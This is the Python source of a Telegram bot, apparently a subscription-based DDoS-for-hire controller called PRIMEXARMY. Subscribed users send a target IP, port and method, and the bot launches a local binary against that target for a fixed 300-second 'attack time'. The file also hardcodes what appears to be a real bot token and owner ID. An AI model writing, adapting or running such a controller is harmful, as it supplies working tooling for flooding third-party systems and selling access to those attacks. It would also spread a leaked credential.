import telebot
from telebot import types
import subprocess
import os
import json
from datetime import datetime

# === CONFIG ===
TOKEN = os.getenv("BOT_TOKEN", "8413805132:AAFyNURC1ZrI5fxKW0N0bP6sfzpCJHvZDf0")
OWNER_ID = int(os.getenv("OWNER_ID", "1419969308"))
DATA_DIR = os.getenv("DATA_DIR", "./data")
TASK_BINARY = os.getenv("TASK_BINARY", "./PRIMEXARMY")
DEFAULT_TIME = 300  # ✅ fixed attack time (300 seconds)

bot = telebot.TeleBot(TOKEN, parse_mode="Markdown")
os.makedirs(DATA_DIR, exist_ok=True)

USERS_FILE = os.path.join(DATA_DIR, "users.json")
users = {}
if os.path.exists(USERS_FILE):
    with open(USERS_FILE, "r") as f:
        users = json.load(f)

def save():
    with open(USERS_FILE, "w") as f:
        json.dump(users, f, indent=2)

# === BOT COMMANDS ===
@bot.message_handler(commands=["start"])
def start(msg):
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    kb.add("ℹ️ My Info", "🚀 Run Task")
    if str(msg.chat.id) == str(OWNER_ID):
        kb.add("📊 Users", "➕ GenKey")
    bot.send_message(msg.chat.id, "🚀 *Welcome to PRIMEXARMY Bot!*", reply_markup=kb)

@bot.message_handler(func=lambda m: m.text == "ℹ️ My Info")
def info(msg):
    uid = str(msg.chat.id)
    if uid not in users:
        bot.send_message(msg.chat.id, "❌ No subscription.")
        return
    bot.send_message(msg.chat.id, f"👤 ID: `{uid}`\n⏳ Expiry: {users[uid]['expiry']}")

@bot.message_handler(func=lambda m: m.text == "➕ GenKey" and str(m.chat.id) == str(OWNER_ID))
def genkey(msg):
    key = f"PRIMEXARMY-{datetime.now().strftime('%H%M%S')}"
    users[str(msg.chat.id)] = {"expiry": str(datetime.now())}
    save()
    bot.send_message(msg.chat.id, f"🔑 New Key Generated:\n`{key}`")

@bot.message_handler(func=lambda m: m.text == "📊 Users" and str(m.chat.id) == str(OWNER_ID))
def listusers(msg):
    txt = "👥 Users:\n" + "\n".join([f"{u} → {d['expiry']}" for u, d in users.items()]) if users else "No users yet."
    bot.send_message(msg.chat.id, txt)

# === TASK HANDLER ===
@bot.message_handler(func=lambda m: m.text == "🚀 Run Task")
def ask_task(msg):
    uid = str(msg.chat.id)
    if uid not in users:
        bot.send_message(msg.chat.id, "❌ No subscription.")
        return
    bot.send_message(msg.chat.id, "Send task details in this format:\n`<ip> <port> <method>`\n\n⏱ Default Time = 300s")
    bot.register_next_step_handler(msg, run_task)

def run_task(msg):
    try:
        args = msg.text.strip().split()
        if len(args) != 3:
            bot.send_message(msg.chat.id, "❌ Invalid format. Use:\n`<ip> <port> <method>`")
            return
        args.append(str(DEFAULT_TIME))  # ✅ auto add 300s
        process = subprocess.Popen([TASK_BINARY] + args)
        bot.send_message(
            msg.chat.id,
            f"🚀 Task started with `{TASK_BINARY}` (PID {process.pid})\nArgs: `{args}`"
        )
    except Exception as e:
        bot.send_message(msg.chat.id, f"❌ Failed to start task: {e}")

print("🚀 PRIMEXARMY Bot running...")
bot.infinity_polling()
